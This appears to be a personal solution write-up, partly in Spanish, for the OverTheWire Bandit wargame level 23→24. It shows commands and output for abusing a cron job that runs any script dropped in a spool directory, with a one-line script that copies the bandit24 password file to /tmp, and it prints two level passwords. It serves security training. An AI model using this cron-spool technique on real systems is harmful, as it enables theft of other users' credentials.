# Bandit Level 23 → Level 24


## Objetivo

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de Acceso
- ssh bandit23@bandit.labs.overthewire.org -p 2220.
- QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solución 
```bash
- ls -la /etc/cron.d/
		total 48
		drwxr-xr-x   2 root root 4096 Sep  1 06:30 .
		drwxr-xr-x 110 root root 4096 Sep  1 06:30 ..
		-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit15_root
		-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit17_root
		-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit22
		-rw-r--r--   1 root root  122 Sep  1 06:30 cronjob_bandit23
		-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit24
		-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit25_root
		-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
		-rwx------   1 root root   52 Sep  1 06:30 otw-tmp-dir
		-rw-r--r--   1 root root  102 Mar 23 13:49 .placeholder
		-rw-r--r--   1 root root  396 Feb  2  2021 sysstat

- cat /etc/cron.d/cronjob_bandit24
		@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
		* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

- cat /usr/bin/cronjob_bandit24.sh
	#!/bin/bash
	
	myname=$(whoami)
	
	cd /var/spool/$myname/foo
	echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
	for i in * .*;
	do
	    if [ "$i" != "." -a "$i" != ".." ];
	    then
	        echo "Handling $i"
	        owner="$(stat --format "%U" ./$i)"
	        if [ "${owner}" = "bandit23" ]; then
	            timeout -s 9 60 ./$i
	        fi
	        rm -f ./$i
	    fi
	done
	
- mkdir /tmp/adolfosh
- cd /tmp/adolfosh
- echo "cat /etc/bandit_pass/bandit24 > /tmp/adolfosh/password" > adolfo.sh
- cat adolfo.sh
    cat /etc/bandit_pass/bandit24 > /tmp/adolfosh/password

- chmod 777 adolfo.sh
- touch password
- chmod 666 password
- ls -la
	total 192
	drwxrwxr-x    2 bandit23 bandit23   4096 Sep  6 13:32 .
	drwxrwx-wt 4821 root     root     184320 Sep  6 13:33 ..
	-rwxrwxrwx    1 bandit23 bandit23     55 Sep  6 13:31 adolfo.sh
	-rw-rw-rw-    1 bandit23 bandit23      0 Sep  6 13:32 password

- cp adolfo.sh /var/spool/bandit24/foo/
- date
   Tue Sep  6 01:35:26 PM UTC 2022
- date
   Tue Sep  6 01:37:32 PM UTC 2022
- 

- ls -la
		total 196
		drwxrwxr-x    2 bandit23 bandit23   4096 Sep  6 13:32 .
		drwxrwx-wt 4821 root     root     184320 Sep  6 13:35 ..
		-rwxrwxrwx    1 bandit23 bandit23     55 Sep  6 13:31 adolfo.sh
		-rw-rw-rw-    1 bandit23 bandit23     33 Sep  6 13:36 password

- cat password
     VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

## Notas Adicionales

## Referencias